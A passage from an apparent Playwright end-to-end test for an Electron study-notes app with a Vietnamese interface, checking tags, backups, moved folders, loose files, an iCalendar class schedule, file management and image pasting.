  await page.waitForSelector('section.recovery', { state: 'detached' })
  const merged = JSON.parse(readFileSync(metaFile, 'utf8')).docs
  check(merged[ES]?.tags?.includes("phục-hồi") && merged[ES]?.tags?.includes("backend") && merged[ES]?.status === 'learning', 'backup merged into the current tags without losing them')
  check(!readdirSync(dataDir(library)).some((f) => f.startsWith('meta.corrupt-')) && readdirSync(dataDir(library)).some((f) => f.startsWith('meta.merged-')), 'merged backup is kept as .merged-, not offered again')
  check((await page.locator('.banner:has-text("Khôi phục…")').count()) === 0, 'recovery banner disappears')

  step('23b. Tags across the workspace')
  await page.click('.tag-row:has-text("#backend") >> text=Đổi tên')
  await page.fill('.tag-row input', 'server')
  await page.press('.tag-row input', 'Enter')
  await page.waitForSelector('.tag-row:has-text("#server")')
  check(JSON.parse(readFileSync(metaFile, 'utf8')).docs[ES]?.tags?.includes('server'), 'renaming a tag changes it in the data file')
  await setAnswer('accept')
  await page.click('.tag-row:has-text("#phục-hồi") >> text=Xoá')
  await page.waitForSelector('.tag-row:has-text("#phục-hồi")', { state: 'detached' })
  check(!JSON.stringify(JSON.parse(readFileSync(metaFile, 'utf8')).docs).includes('phục-hồi'), 'deleting a tag removes it from every document')
  const orphanLabel = await page.textContent('.tags-section .setting-row')
  await page.click('.tags-section >> text=Dọn dẹp')
  await page.waitForFunction(() => document.querySelector('.tags-section .setting-row')?.textContent?.includes(': 0 mục'))
  await setAnswer('dismiss')
  check(/: [1-9]\d* mục/.test(orphanLabel) && !JSON.parse(readFileSync(metaFile, 'utf8')).docs['gone/old.md'], `clean-up removes data of deleted files (${orphanLabel.trim()})`)

  step('23c. Sidebar order and arrow keys')
  await settingsTab('Thư viện')
  await page.click('dialog.settings >> text=Mới sửa trước')
  await page.click('dialog.settings >> text=Xong')
  await page.waitForTimeout(300)
  const order = await page.evaluate(async () => {
    const lib = await window.api.getLibrary()
    const want = lib.docs
      .filter((d) => d.root === lib.roots[0].key && /^backend\/[^/]+$/.test(d.rel))
      .sort((a, b) => b.mtime - a.mtime || a.title.localeCompare(b.title, 'vi'))
      .map((d) => d.rel)
    const shown = [...document.querySelectorAll('.doc-list .row.doc')].map((r) => r.getAttribute('title')).filter((t) => /^backend\/[^/]+$/.test(t))
    return { want, shown }
  })
  check(order.want.length > 1 && order.want.join('|') === order.shown.join('|'), `sidebar sorted by last change (${order.shown.join(', ')})`)
  await page.focus(`.doc-list .row.doc[title="${order.shown[0]}"]`)
  await page.keyboard.press('ArrowDown')
  await page.keyboard.press('Enter')
  await docPathIs(order.shown[1])
  check(true, 'ArrowDown + Enter opens the next document')
  await page.focus('.doc-list .row.folder:has-text("backend")')
  await page.keyboard.press('ArrowLeft')
  check((await page.getAttribute('.doc-list .row.folder:has-text("backend")', 'aria-expanded')) === 'false', 'ArrowLeft closes a folder')
  await page.keyboard.press('ArrowRight')
  check((await page.getAttribute('.doc-list .row.folder:has-text("backend")', 'aria-expanded')) === 'true', 'ArrowRight opens it again')

  step('23d. Note about the whole document, notes in Markdown')
  await openDoc('React useEffect — khi nào chạy?')
  await page.waitForSelector('.markdown h2')
  await page.click('.panel-tabs >> text=Ghi chú')
  await page.click('.doc-note >> text=+ Viết')
  await page.fill('.doc-note textarea', '**Tóm tắt:** effect chạy sau render\n- ý 1\n- ý 2')
  await page.keyboard.press('Control+Enter')
  await page.waitForSelector('.doc-note-text strong')
  check((await page.locator('.doc-note-text li').count()) === 2, 'document note is shown as Markdown')
  const savedNotes = JSON.parse(readFileSync(notesFile, 'utf8')).docs[REACT]
  check(savedNotes?.docNote?.text?.startsWith('**Tóm tắt:**') && savedNotes.items.length > 0, 'document note saved next to the highlights')
  await page.click('.note-card .note-card-edit >> nth=0')
  await page.fill('.note-popover textarea', 'Có `code` và **đậm**')
  await page.keyboard.press('Control+Enter')
  await page.waitForSelector('.note-card-text code')
  check(true, 'highlight notes are shown as Markdown')
  await page.screenshot({ path: shot('23-doc-note') })

  // 18. Removing a folder from the workspace keeps its files.
  step("18. Remove folder")
  await setAnswer('accept')
  await page.hover('.root-row:has-text("notes")')
  await page.click('.root-row:has-text("notes") .root-remove')
  await page.waitForFunction(() => document.querySelectorAll('.root-row').length === 0)
  check((await page.textContent('.library-name-text')) === 'library', 'removed folder disappears; workspace shows the one folder left')
  check(existsSync(path.join(notes, 'devops', 'Docker cơ bản.md')), 'removing a folder does not delete its files')
  const ws = JSON.parse(readFileSync(path.join(userData, 'settings.json'), 'utf8')).libraryPaths
  check(Array.isArray(ws) && ws.length === 1, 'workspace folders saved in settings')

  // 24. Issue #24: double-clicking a document in Explorer while the app runs starts a second
  // copy with the file on its command line; it hands the file over to this window and quits.
  step('24. Open a file from Explorer')
  const openWithApp = (file) =>
    new Promise((resolve) => {
      const child = spawn(electronPath, [projectRoot, file], { env: { ...process.env, STUDYDOCS_USER_DATA: userData }, stdio: 'ignore' })
      child.on('exit', resolve)
      setTimeout(() => (child.kill(), resolve('timeout')), 20000)
    })
  const secondExit = await openWithApp(file(ES))
  await docPathIs(ES)
  check(secondExit !== 'timeout', 'a file opened from Explorer shows in the running app (second copy quits)')
  const extra = path.join(workDir, 'extra')
  mkdirSync(extra)
  writeFileSync(path.join(extra, 'Ngoài workspace.md'), '# Ngoài workspace\n\nFile mở từ Explorer.')
  await openWithApp(path.join(extra, 'Ngoài workspace.md'))
  await docPathIs('Ngoài workspace.md')
  await page.waitForSelector('.loose-group .row.doc >> text=Ngoài workspace')
  check((await page.textContent('.library-name-text')) === 'library', 'a file outside the workspace opens as a loose file; no folder is added')

  // Its tags go to the app's data folder too; nothing is written next to the file.
  await page.fill('.tag-editor input', 'le')
  await page.press('.tag-editor input', 'Enter')
  await page.waitForTimeout(300)
  check(JSON.parse(readFileSync(path.join(dataDir(extra), 'meta.json'), 'utf8')).docs['Ngoài workspace.md']?.tags?.[0] === 'le', 'tags of a loose file are saved')
  check(readdirSync(extra).length === 1 && !readdirSync(library).some((f) => f.startsWith('.docs-')), 'nothing is written into the documents\' folders')

  // Ctrl+O: pick files anywhere.
  step('25. Open files (Ctrl+O), remove from the list, backup')
  writeFileSync(path.join(extra, 'Thêm.md'), '# Thêm một file\n\nMở bằng Ctrl+O.')
  await app.evaluate(({ dialog }, file) => {
    globalThis.__realOpen = dialog.showOpenDialog
    dialog.showOpenDialog = async () => ({ canceled: false, filePaths: [file] })
  }, path.join(extra, 'Thêm.md'))
  await page.click('.sidebar-foot')
  await page.keyboard.press('Control+O')
  await docPathIs('Thêm.md')
  check((await page.locator('.loose-group .row.doc').count()) === 2, 'Ctrl+O opens a file and lists it under "File lẻ"')
  await page.hover('.loose-row:has-text("Thêm một file")')
  await page.click('.loose-row:has-text("Thêm một file") .root-remove')
  await page.waitForFunction(() => document.querySelectorAll('.loose-group .row.doc').length === 1)
  check(existsSync(path.join(extra, 'Thêm.md')), 'removing a loose file from the list does not delete it')
  writeFileSync(path.join(extra, 'bí mật.txt'), 'không được lộ')
  writeFileSync(path.join(extra, 'hình.svg'), '<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4"/>')
  const looseStatus = (name) => app.evaluate(async ({ net }, u) => (await net.fetch(u)).status, `doc://library/${keyOf(extra)}/${encodeURIComponent(name)}`)
  const statuses = [await looseStatus('Ngoài workspace.md'), await looseStatus('hình.svg'), await looseStatus('bí mật.txt'), await looseStatus('Thêm.md')]
  check(statuses.join(',') === '200,200,404,404', `next to a loose file only the file itself and page resources are served (${statuses.join(', ')})`)

  // Backup and restore (Settings): a tag removed after the backup comes back.
  const backupFile = path.join(workDir, 'backup.json')
  await app.evaluate(({ dialog }, file) => {
    globalThis.__realSave = dialog.showSaveDialog
    dialog.showSaveDialog = async () => ({ canceled: false, filePath: file })
    dialog.showOpenDialog = async () => ({ canceled: false, filePaths: [file] })
  }, backupFile)
  await page.click('.sidebar-head .icon-btn[title="Cài đặt"]')
  await settingsTab('Dữ liệu')
  await page.click('dialog.settings >> text=Sao lưu ra file…')
  await page.waitForSelector('dialog.settings .dialog-msg >> text=Đã sao lưu')
  const backup = JSON.parse(readFileSync(backupFile, 'utf8'))
  const libPart = backup.folders.find((x) => x.path === library)
  check(backup.app === 'study-docs' && libPart?.meta?.[REACT]?.tags?.includes('react') && Object.keys(libPart?.notes ?? {}).length > 0, 'backup holds tags and notes of every folder')
  const reactId = await page.evaluate(async (rel) => (await window.api.getLibrary()).docs.find((d) => d.rel === rel).path, REACT)
  await page.evaluate((id) => window.api.updateMeta(id, { tags: [] }), reactId)
  await page.click('dialog.settings >> text=Khôi phục từ file…')
  await page.waitForSelector('dialog.settings .dialog-msg >> text=Đã khôi phục')
  check(JSON.parse(readFileSync(metaFile, 'utf8')).docs[REACT]?.tags?.includes('react'), 'restoring a backup brings the data back (merged)')
  await page.click('dialog.settings >> text=Xong')

  // A folder added later takes over the loose files inside it, with their tags and notes,
  // also from a sub-folder (their paths get the sub-folder in front).
  step('26. Adding a folder takes over its loose files')
  const sub = path.join(extra, 'con')
  mkdirSync(sub)
  writeFileSync(path.join(sub, 'Trong thư mục con.md'), '# Trong thư mục con\n\nGhi chú phải đi theo.')
  const [subId] = await page.evaluate((f) => window.api.addFiles([f]), path.join(sub, 'Trong thư mục con.md'))
  await page.waitForSelector('.loose-group .row.doc >> text=Trong thư mục con')
  await page.click('.loose-group .row.doc >> text=Trong thư mục con')
  await page.fill('.tag-editor input', 'theo')
  await page.press('.tag-editor input', 'Enter')
  await page.waitForTimeout(300)
  check(!!subId && JSON.parse(readFileSync(path.join(dataDir(sub), 'meta.json'), 'utf8')).docs['Trong thư mục con.md']?.tags?.[0] === 'theo', 'a loose file in a sub-folder gets its own data folder')
  // Tags of v0.8 and older in this folder, in a file too broken to read.
  writeFileSync(path.join(extra, '.docs-notes.json'), '{ "version": 1, "docs": { "a.md": { "items": [ <<< hỏng')
  await app.evaluate(({ dialog }, folder) => {
    dialog.showOpenDialog = async () => ({ canceled: false, filePaths: [folder] })
  }, extra)
  await page.click('.sidebar-head .icon-btn[title="Thêm thư mục vào workspace"]')
  await page.waitForFunction(() => document.querySelectorAll('.loose-group').length === 0, null, { timeout: 15000 })
  const legacyBackups = readdirSync(dataDir(extra)).filter((n) => n.startsWith('notes.corrupt-v08-'))
  const recoveryNow = (await page.evaluate(() => window.api.getLibrary())).recovery
  check(
    legacyBackups.length === 1 && recoveryNow.some((r) => r.file === legacyBackups[0]) && (await page.locator('.banner >> text=Khôi phục…').count()) === 1,
    'old notes too broken to read are kept as a broken backup and offered in "Khôi phục…"'
  )
  // Not needed further on: out of the way, so later steps see the same banners as before.
  await page.evaluate(({ root, file }) => window.api.discardBackup(root, file), { root: recoveryNow.find((r) => r.file === legacyBackups[0]).root, file: legacyBackups[0] })
  const extraMeta = JSON.parse(readFileSync(path.join(dataDir(extra), 'meta.json'), 'utf8')).docs
  check(
    extraMeta['con/Trong thư mục con.md']?.tags?.[0] === 'theo' && extraMeta['Ngoài workspace.md']?.tags?.[0] === 'le',
    'the added folder takes over its loose files and their tags (also from a sub-folder)'
  )
  check((await page.locator('.root-row').count()) === 2 && (await page.locator('.doc-list .row.doc >> text=Trong thư mục con').count()) === 1, 'they now show in the folder tree')
  check(JSON.parse(readFileSync(path.join(userData, 'settings.json'), 'utf8')).looseFiles?.length === 0, 'the list of loose files is updated')

  await app.evaluate(({ dialog }) => {
    dialog.showOpenDialog = globalThis.__realOpen
    dialog.showSaveDialog = globalThis.__realSave
  })

  // Every question so far was the app's own dialog (window.confirm is no longer used).
  step('27. Question dialogs')
  const asked = await page.evaluate(() => window.__smokeAsked)
  await setAnswer('hold')
  await page.hover('.root-row:has-text("extra")')
  await page.click('.root-row:has-text("extra") .root-remove')
  await page.waitForSelector('dialog.ask[open]')
  const buttons = await page.locator('dialog.ask[open] .ask-buttons button').allTextContents()
  await page.waitForTimeout(400) // let the opening animation finish
  await page.screenshot({ path: shot('17-ask-dialog') })
  await page.click('dialog.ask[open] [data-answer="cancel"]')
  await page.waitForSelector('dialog.ask[open]', { state: 'detached' }).catch(() => {})
  check(asked >= 8 && buttons.join('|') === 'Bỏ khỏi workspace|Huỷ' && (await page.locator('.root-row').count()) === 2, `questions use the app's own dialog (${asked} so far; buttons: ${buttons.join(', ')})`)
  await setAnswer('dismiss')

  // Review point 2: a folder at a new path (renamed, moved, other drive letter, other PC)
  // gets its old tags and notes back. The "notes" folder left the workspace in step 18; its
  // data is still under its old path. A copy of it elsewhere is added now.
  step('28. A moved folder finds its tags and notes again')
  const movedNotes = path.join(workDir, 'notes moved')
  cpSync(notes, movedNotes, { recursive: true, filter: (src) => !path.basename(src).startsWith('.docs-') }) // no old .docs-* files: only the moved data can match
  await setAnswer('accept') // "Chuyển sang đây"
  const askedBeforeMove = await page.evaluate(() => window.__smokeAsked)
  await app.evaluate(({ dialog }, folder) => {
    globalThis.__realOpen3 = dialog.showOpenDialog
    dialog.showOpenDialog = async () => ({ canceled: false, filePaths: [folder] })
  }, movedNotes)
  await page.click('.sidebar-head .icon-btn[title="Thêm thư mục vào workspace"]')
  await page.waitForFunction(() => document.querySelectorAll('.root-row').length === 3, null, { timeout: 15000 })
  await page.waitForFunction((before) => window.__smokeAsked > before, askedBeforeMove, { timeout: 15000 }).catch(() => {})
  await page.waitForTimeout(800)
  const movedMeta = () => JSON.parse(readFileSync(path.join(dataDir(movedNotes), 'meta.json'), 'utf8')).docs
  const oldInfo = JSON.parse(readFileSync(path.join(dataDir(notes), 'info.json'), 'utf8'))
  check(movedMeta()['devops/Docker cơ bản.md']?.tags?.includes('devops') && oldInfo.mergedInto === movedNotes, 'a moved folder is recognised by its files; after asking, its tags move to the new path')

  // Restoring a backup made when the folder had its old path: you pick where the data goes.
  await page.evaluate((id) => window.api.updateMeta(id, { tags: [] }), (await page.evaluate(async () => (await window.api.getLibrary()).docs.find((d) => d.name === 'Docker cơ bản.md').path)))
  await page.waitForTimeout(300)
  await app.evaluate(({ dialog }, file) => (dialog.showOpenDialog = async () => ({ canceled: false, filePaths: [file] })), backupFile)
  const askedBeforeRestore = await page.evaluate(() => window.__smokeAsked)
  await page.evaluate(() => window.api.importData()) // the first choice offered is the matching folder
  const restoreAsks = (await page.evaluate(() => window.__smokeAsked)) - askedBeforeRestore
  check(restoreAsks >= 1 && movedMeta()['devops/Docker cơ bản.md']?.tags?.includes('devops'), `restoring a backup from the old path asks which folder gets the data (${restoreAsks} asked)`)
  await app.evaluate(({ dialog }) => (dialog.showOpenDialog = globalThis.__realOpen3))
  await setAnswer('dismiss')

  step('29. Calendar: a repeating class with documents and notes')
  const icsFile = path.join(userData, 'data', 'calendar.ics')
  const ics = () => readFileSync(icsFile, 'utf8')
  const calLinks = () => JSON.parse(readFileSync(path.join(userData, 'data', 'calendar.json'), 'utf8')).links
  await page.click('.sidebar-head .icon-btn[title="Lịch học"]')
  await page.waitForSelector('.calendar-host.fc')
  // Tuesday 5 March 2030, 07:00–09:30; custom repeat: Tuesday and Thursday, 6 times.
  await page.click('.calendar-toolbar >> text=+ Sự kiện')
  await page.waitForSelector('dialog.event-dialog[open]')
  await page.fill('dialog.event-dialog input[name="summary"]', 'Lập trình mạng')
  await page.fill('input[aria-label="Ngày bắt đầu"]', '2030-03-05')
  await page.fill('input[aria-label="Giờ bắt đầu"]', '07:00')
  await page.fill('input[aria-label="Giờ kết thúc"]', '09:30')
  await page.selectOption('select[aria-label="Lặp lại"]', 'custom')
  await page.click('.weekday-picker button[title="thứ Năm"]')
  await page.click('.radio-list label:has-text("Sau") input[type=radio]')
  await page.fill('input[aria-label="Số lần"]', '6')
  await page.fill('dialog.event-dialog input[aria-label="Địa điểm"]', 'Phòng B2')
  await page.waitForSelector('.event-preview')
  const repeatText = await page.textContent('.repeat-summary')
  await page.click('dialog.event-dialog footer .btn.primary')
  await page.waitForSelector('dialog.event-dialog', { state: 'detached' })
  await page.waitForSelector('.fc-event[data-key$="|2030-03-07T07:00"]')
  check(repeatText === 'Hằng tuần vào T3, T5, 6 lần', `the custom repeat is described in words (${repeatText})`)
  check(
    /^BEGIN:VCALENDAR\r\n/.test(ics()) && ics().includes('DTSTART:20300305T070000\r\n') && ics().includes('RRULE:FREQ=WEEKLY;COUNT=6;BYDAY=TU,TH\r\n') && ics().includes('LOCATION:Phòng B2\r\n'),
    'events are stored as a standard iCalendar file (DTSTART, RRULE, LOCATION)'
  )
  check((await page.locator('.fc-event').count()) === 2, 'the week shows both classes of the repeat')

  // A document dragged from the sidebar onto a class.
  check((await page.getAttribute('.doc-list .row.doc >> nth=0', 'draggable')) === 'true', 'documents in the sidebar can be dragged')
  const esId = await page.evaluate(async (rel) => (await window.api.getLibrary()).docs.find((d) => d.rel === rel).path, ES)
  await setAnswer('accept') // "Buổi này"
  await page.evaluate((id) => {
    const dt = new DataTransfer()
    dt.setData('application/x-studydocs-doc', id)
    document.querySelector('.fc-event[data-key$="|2030-03-05T07:00"]').dispatchEvent(new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true }))
  }, esId)
  await page.waitForSelector('.event-panel .event-links li')
  const eventUid = Object.keys(calLinks())[0]
  check(calLinks()[eventUid]?.occ?.['2030-03-05T07:00']?.[0]?.path === file(ES), 'a document dropped on a class is linked to that class')

  // Course material for every class, from the picker.
  await page.click('.event-panel >> text=+ Gắn tài liệu…')
  await page.click('dialog.doc-picker .segmented >> text=Cả môn')
  await page.fill('dialog.doc-picker input', 'khi nao chay')
  await page.click('dialog.doc-picker .row.doc')
  await page.waitForFunction(() => document.querySelectorAll('.event-panel section')[1]?.querySelectorAll('.event-links li').length === 1)
  check(calLinks()[eventUid]?.series?.[0]?.path === file(REACT), 'a document picked for the whole course is linked to every class')

  // A whole folder, dragged from the sidebar tree: every document in it, also ones added later.
  check((await page.getAttribute('.doc-list .row.folder:has-text("frontend")', 'draggable')) === 'true', 'folders in the sidebar can be dragged')
  const frontendId = await page.evaluate(async () => {
    const lib = await window.api.getLibrary()
    const d = lib.docs.find((x) => x.rel.startsWith('frontend/'))
    return `${d.root}/frontend`
  })
  await setAnswer('accept') // "Buổi này"
  await page.evaluate((id) => {
    const dt = new DataTransfer()
    dt.setData('application/x-studydocs-folder', id)
    document.querySelector('.fc-event[data-key$="|2030-03-05T07:00"]').dispatchEvent(new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true }))
  }, frontendId)
  await page.waitForSelector('.event-panel .folder-link')
  const folderCount = await page.locator('.event-panel .folder-link .folder-docs li').count()
  check(calLinks()[eventUid]?.occ?.['2030-03-05T07:00']?.some((l) => l.kind === 'folder' && l.path === path.join(library, 'frontend')) && folderCount >= 3, `a folder dropped on a class is linked, with its documents listed (${folderCount})`)
  writeFileSync(file('frontend/Bài mới.md'), '# Bài mới\n\nThêm sau khi gắn thư mục.')
  const folderHas = (title) =>
    page.evaluate(async ({ uid, title }) => (await window.api.calendarDetail(uid, '2030-03-05T07:00')).links.some((l) => l.kind === 'folder' && l.docs.some((d) => d.title === title)), { uid: eventUid, title })
  for (let i = 0; i < 50 && !(await folderHas('Bài mới')); i++) await page.waitForTimeout(100)
  const folderDocs = (await folderHas('Bài mới')) ? ['Bài mới'] : []
  check(folderDocs.includes('Bài mới'), 'a document added to the folder later belongs to the class too')

  // Files anywhere on the PC, picked from the dialog: opened as single files and linked.
  const outside = path.join(workDir, 'Đề cương môn.md')
  writeFileSync(outside, '# Đề cương môn\n\nTuần 1–15.')
  await app.evaluate(({ dialog }, f) => {
    globalThis.__realOpen5 = dialog.showOpenDialog
    dialog.showOpenDialog = async () => ({ canceled: false, filePaths: [f] })
  }, outside)
  await page.click('.event-panel >> text=+ Gắn tài liệu…')
  await page.click('dialog.doc-picker .segmented >> text=Cả môn')
  await page.click('dialog.doc-picker >> text=Chọn file trên máy…')
  await page.waitForFunction(() => [...document.querySelectorAll('.event-panel .event-links li')].some((li) => li.textContent.includes('Đề cương môn')))
  await app.evaluate(({ dialog }) => (dialog.showOpenDialog = globalThis.__realOpen5))
  check(calLinks()[eventUid]?.series?.some((l) => l.path === outside) && (await page.locator('.loose-group .row.doc:has-text("Đề cương môn")').count()) === 1, 'a file picked anywhere on the PC goes to "Single files" and is linked')

  // Notes for this class: a Markdown file from a template, opened and linked.
  const classNotesDir = path.join(library, 'ghi-chep')
  await app.evaluate(({ dialog }, dir) => {
    globalThis.__realOpen4 = dialog.showOpenDialog
    dialog.showOpenDialog = async () => ({ canceled: false, filePaths: [dir] })
  }, classNotesDir)
  await page.click('.event-panel >> text=Ghi chép buổi này')
  await docPathIs('ghi-chep/Lập trình mạng/2030-03-05.md')
  const notesText = readFileSync(path.join(classNotesDir, 'Lập trình mạng', '2030-03-05.md'), 'utf8')
  check(notesText.startsWith('# Lập trình mạng — 05/03/2030') && notesText.includes('Phòng B2'), 'notes for a class: a .md file from a template, opened right away')
  await page.waitForSelector('.class-chip')
  check((await page.textContent('.class-chip')).includes('T3, 05/03'), 'the document shows the class it belongs to')
  await page.click('.class-chip')
  await page.waitForSelector('.event-panel h2')
  check((await page.textContent('.event-panel .event-meta')).includes('T3, 05/03'), 'clicking it opens that class in the calendar')

  // Only the Thursday class moves to another room (RECURRENCE-ID), then one class is deleted (EXDATE).
  await page.click('.fc-event[data-key$="|2030-03-07T07:00"]')
  await page.waitForFunction(() => document.querySelector('.event-panel .event-meta')?.textContent.includes('07/03'))
  await page.click('.event-actions >> text=Sửa')
  await page.fill('dialog.event-dialog input[aria-label="Địa điểm"]', 'Phòng C5')
  await setAnswer('accept') // "Chỉ sự kiện này"
  await page.click('dialog.event-dialog footer .btn.primary')
  await page.waitForSelector('dialog.event-dialog', { state: 'detached' })
  await page.waitForFunction(() => document.querySelector('.event-panel .event-meta')?.textContent.includes('Phòng C5'))
  check(ics().includes('RECURRENCE-ID:20300307T070000\r\n') && ics().includes('LOCATION:Phòng C5\r\n') && ics().includes('LOCATION:Phòng B2\r\n'), 'changing one class of a repeat keeps the others (RECURRENCE-ID)')
  await page.click('.calendar-toolbar .icon-btn[title="Sau"]')
  await page.click('.fc-event[data-key$="|2030-03-12T07:00"]')
  await page.waitForFunction(() => document.querySelector('.event-panel .event-meta')?.textContent.includes('12/03'))
  await page.click('.event-actions >> text=Xoá')
  await page.waitForSelector('.fc-event[data-key$="|2030-03-12T07:00"]', { state: 'detached' })
  check(ics().includes('EXDATE:20300312T070000\r\n') && (await page.locator('.fc-event').count()) === 1, 'deleting one class skips that date (EXDATE)')

  // Export to .ics, and the backup carries the calendar.
  const exported = path.join(workDir, 'lich.ics')
  await app.evaluate(({ dialog }, file) => (dialog.showSaveDialog = async () => ({ canceled: false, filePath: file })), exported)
  await page.click('.calendar-toolbar >> text=Xuất .ics…')
  for (let i = 0; i < 50 && !existsSync(exported); i++) await page.waitForTimeout(100)
  await page.waitForTimeout(200)
  check(existsSync(exported) && readFileSync(exported, 'utf8') === ics(), 'the calendar exports to an .ics file')
  const calBackup = path.join(workDir, 'backup-cal.json')
  await app.evaluate(({ dialog }, file) => (dialog.showSaveDialog = async () => ({ canceled: false, filePath: file })), calBackup)
  await page.evaluate(() => window.api.exportData())
  const withCal = JSON.parse(readFileSync(calBackup, 'utf8'))
  check(withCal.calendar?.ics?.includes(`UID:${eventUid}`) && withCal.calendar?.links?.[eventUid]?.series?.length === 2, 'backups include the calendar and its links')
  await app.evaluate(({ dialog }) => {
    dialog.showOpenDialog = globalThis.__realOpen4
    dialog.showSaveDialog = globalThis.__realSave
  })
  await setAnswer('dismiss')
  await page.screenshot({ path: shot('calendar') })

  step('30. Files: new notes (.md / .html), folders, rename, move, Recycle Bin')
  const libKey = keyOf(library)
  const metaOfLib = () => JSON.parse(readFileSync(metaFile, 'utf8')).docs
  const menuOn = async (selector, item) => {
    await page.click(selector, { button: 'right' })
    await page.click(`.tree-menu >> text=${item}`)
  }
  const nameDialog = async (values, kind) => {
    await page.waitForSelector('dialog.name-dialog[open]')
    const inputs = page.locator('dialog.name-dialog input')
    for (let i = 0; i < values.length; i++) await inputs.nth(i).fill(values[i])
    if (kind) await page.click(`dialog.name-dialog .name-kind button:has-text("${kind === 'md' ? 'Markdown' : 'HTML'}")`)
    await page.click('dialog.name-dialog footer .btn.primary')
  }
  const backendRow = `.doc-list .row.folder[data-folder-id="${libKey}/backend"]`

  await menuOn(backendRow, 'Bài mới…')
  await nameDialog(['Ghi chép HTML'], 'html')
  await docPathIs('backend/Ghi chép HTML.html')
  const newHtml = read('backend/Ghi chép HTML.html')
  check(newHtml.startsWith('<!doctype html>') && newHtml.includes('<h1>Ghi chép HTML</h1>') && newHtml.includes('<meta charset="utf-8">'), 'a new HTML note: a small page with its title, opened right away')

  // Ctrl+N: next to the open note, and the last type chosen is the default.
  await page.click('.sidebar-foot')
  await page.keyboard.press('Control+N')
  await page.waitForSelector('dialog.name-dialog[open]')
  const defaultKind = await page.textContent('dialog.name-dialog .name-kind button.active')
  await nameDialog(['Bài mới tạo'], 'md')
  await docPathIs('backend/Bài mới tạo.md')
  check(defaultKind.includes('HTML') && read('backend/Bài mới tạo.md') === '# Bài mới tạo\n\n', `Ctrl+N creates a note next to the open one; the last type is remembered (${defaultKind})`)
  // A name that is taken: the dialog stays open and says so.
  await page.keyboard.press('Control+N')
  await nameDialog(['Bài mới tạo'], 'md')
  await page.waitForSelector('dialog.name-dialog .name-error')
  check((await page.textContent('dialog.name-dialog .name-error')).includes('Đã có'), 'a name already used is refused, in the dialog')
  await page.click('dialog.name-dialog footer >> text=Huỷ')

  // F2 renames; tags follow.
  await page.fill('.tag-editor input', 'moi')
  await page.press('.tag-editor input', 'Enter')
  await page.waitForTimeout(300)
  await page.focus(`.doc-list .row.doc[data-id="${libKey}/backend/Bài mới tạo.md"]`)
  await page.keyboard.press('F2')
  await nameDialog(['Bài đã đổi tên'])
  await docPathIs('backend/Bài đã đổi tên.md')
  check(!existsSync(file('backend/Bài mới tạo.md')) && metaOfLib()['backend/Bài đã đổi tên.md']?.tags?.includes('moi'), 'F2 renames a note (the extension is kept), its tags follow, it stays open')

  // Dragged onto another folder of the tree: moved there.
  await page.evaluate(({ id, target }) => {
    const dt = new DataTransfer()
    dt.setData('application/x-studydocs-doc', id)
    document.querySelector(`.doc-list .row.folder[data-folder-id="${target}"]`).dispatchEvent(new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true }))
  }, { id: `${libKey}/backend/Bài đã đổi tên.md`, target: `${libKey}/frontend` })
  await docPathIs('frontend/Bài đã đổi tên.md')
  check(existsSync(file('frontend/Bài đã đổi tên.md')) && metaOfLib()['frontend/Bài đã đổi tên.md']?.tags?.includes('moi'), 'a note dragged onto a folder moves there, with its tags')

  // A new folder starts with a note; renaming the folder keeps the open note open.
  await menuOn(`.doc-list .row.folder[data-folder-id="${libKey}/frontend"]`, 'Thư mục mới…')
  await nameDialog(['Chương 1', 'Mở đầu'], 'md')
  await docPathIs('frontend/Chương 1/Mở đầu.md')
  await menuOn(`.doc-list .row.folder[data-folder-id="${libKey}/frontend/Chương 1"]`, 'Đổi tên…')
  await nameDialog(['Chương một'])
  await docPathIs('frontend/Chương một/Mở đầu.md')
  check(existsSync(file('frontend/Chương một/Mở đầu.md')) && !existsSync(file('frontend/Chương 1')), 'new folder (with a first note), then renamed: the open note follows')

  // Delete goes to the Recycle Bin, after asking (the test deletes for real instead of filling your Recycle Bin).
  await app.evaluate(({ shell }) => {
    globalThis.__realTrash = shell.trashItem
    globalThis.__trashed = []
    shell.trashItem = async (p) => {
      globalThis.__trashed.push(p)
      process.getBuiltinModule('fs').rmSync(p, { recursive: true })
    }
  })
  await setAnswer('accept') // "Xoá"
  await menuOn(`.doc-list .row.doc[data-id="${libKey}/frontend/Bài đã đổi tên.md"]`, 'Xoá (vào Thùng rác)')
  await page.waitForSelector(`.doc-list .row.doc[data-id="${libKey}/frontend/Bài đã đổi tên.md"]`, { state: 'detached' })
  const trashed = await app.evaluate(({ shell }) => ((shell.trashItem = globalThis.__realTrash), globalThis.__trashed))
  check(trashed.length === 1 && trashed[0] === file('frontend/Bài đã đổi tên.md'), 'delete asks, then moves the note to the Recycle Bin')
  await setAnswer('dismiss')

  step('31. Pasting images: embedded in the file (base64), or saved in assets/')
  // A 2000 × 1000 picture on the clipboard, pasted into Raw.
  const pasteImage = () =>
    page.evaluate(async () => {
      const canvas = document.createElement('canvas')
      canvas.width = 2000
      canvas.height = 1000
      const g = canvas.getContext('2d')
      g.fillStyle = '#2f5d8a'
      g.fillRect(0, 0, 2000, 1000)
      g.fillStyle = '#fff'
      g.fillRect(200, 200, 600, 300)
      const blob = await new Promise((r) => canvas.toBlob(r, 'image/png'))
      const dt = new DataTransfer()
      dt.items.add(new File([blob], 'chup.png', { type: 'image/png' }))
      document.querySelector('.raw-host .cm-content').dispatchEvent(new ClipboardEvent('paste', { clipboardData: dt, bubbles: true, cancelable: true }))
    })
  await menuOn('.root-row:has-text("library") .row.folder.root', 'Bài mới…')
  await nameDialog(['Ảnh dán'], 'md')
  await docPathIs('Ảnh dán.md')
  await page.click('.doc-controls >> text=Raw')
  await page.waitForSelector('.raw-host .cm-content')
  await page.click('.raw-host .cm-content')
  await page.keyboard.press('Control+End')
  await pasteImage()
  await page.waitForSelector('.raw-host .cm-data-url')
  await page.keyboard.press('Control+S')
  await page.waitForFunction(() => !document.querySelector('.raw-toolbar .dirty-dot'))
  const embedded = read('Ảnh dán.md')
  const b64 = /!\[\]\(data:image\/webp;base64,([A-Za-z0-9+/=]+)\)/.exec(embedded)?.[1] ?? ''
  check(b64.length > 100, `a pasted image is embedded in the file as WebP base64 (${Math.round((b64.length * 3) / 4 / 1024)} KB)`)
  check((await page.textContent('.raw-host .cm-data-url')).startsWith('[ảnh '), 'Raw shows a label instead of the base64 text')
  await page.click('.raw-toolbar >> text=Đóng raw')
